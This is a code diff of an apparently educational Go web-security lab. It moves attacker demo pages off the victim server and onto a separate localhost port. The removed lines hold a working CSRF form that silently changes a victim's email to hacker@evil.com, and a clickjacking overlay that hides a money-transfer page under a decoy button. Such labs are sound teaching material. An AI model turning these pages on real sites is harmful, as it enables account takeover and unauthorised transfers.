@@ -29,11 +29,7 @@ func main() {
 	mux.HandleFunc("/update-email", updateEmailHandler)
 	mux.HandleFunc("/transfer", transferHandler)
 
-	// Attacker Site
-	mux.HandleFunc("/attacker/csrf", attackerCSRFHandler)
-	mux.HandleFunc("/attacker/clickjacking", attackerClickjackingHandler)
-
-	log.Println("Server starting on :8080")
+	log.Println("Victim site starting on :8080")
 	log.Fatal(http.ListenAndServe(":8080", mux))
 }
 
@@ -53,8 +49,8 @@ func homeHandler(w http.ResponseWriter, r *http.Request) {
 		<hr>
 		<h2>Links to Attacker Site (for exercises)</h2>
 		<ul>
-			<li><a href="/attacker/csrf">CSRF Attack Page</a></li>
-			<li><a href="/attacker/clickjacking">Clickjacking Attack Page</a></li>
+			<li><a href="http://localhost:8081/csrf">CSRF Attack Page (port 8081)</a></li>
+			<li><a href="http://localhost:8081/clickjacking">Clickjacking Attack Page (port 8081)</a></li>
 		</ul>
 	`, data.Email)
 }
@@ -136,62 +132,5 @@ func transferHandler(w http.ResponseWriter, r *http.Request) {
 		<form method="POST">
 			<button class="btn">Confirm Transfer</button>
 		</form>
-	`)
-}
-
-// --- Attacker Site Endpoints ---
-
-func attackerCSRFHandler(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	fmt.Fprintf(w, `
-		<h1 style="color:red">Congratulations! You won a prize!</h1>
-		<p>Press the button below to claim your reward!</p>
-		<form action="http://localhost:8080/update-email" method="POST">
-			<input type="hidden" name="email" value="hacker@evil.com">
-			<input type="submit" value="Claim Prize" style="padding:10px 20px; font-size:18px">
-		</form>
-	`)
-}
-
-func attackerClickjackingHandler(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	fmt.Fprintf(w, `
-		<style>
-			#victim-frame {
-				width: 100%%;
-				height: 500px;
-				position: absolute;
-				top: 0;
-				left: 0;
-				opacity: 0.4; /* Semi-transparent for demo; real attack uses 0.0 */
-				z-index: 2;
-			}
-			#fake-page {
-				width: 100%%;
-				height: 500px;
-				position: absolute;
-				top: 0;
-				left: 0;
-				z-index: 1;
-				background: #e0ffe0;
-				text-align: center;
-				padding-top: 100px;
-			}
-			.fake-btn {
-				margin-top: 105px;
-				padding: 25px 50px;
-				font-size: 24px;
-				background: #44bb44;
-				color: white;
-				border: none;
-				border-radius: 10px;
-			}
-		</style>
-		<div id="fake-page">
-			<h1>Free Cookies Giveaway!</h1>
-			<p>Press the big button below to get free cookies now!</p>
-			<button class="fake-btn">GET COOKIES</button>
-		</div>
-		<iframe id="victim-frame" src="http://localhost:8080/transfer"></iframe>
 	`)
 }
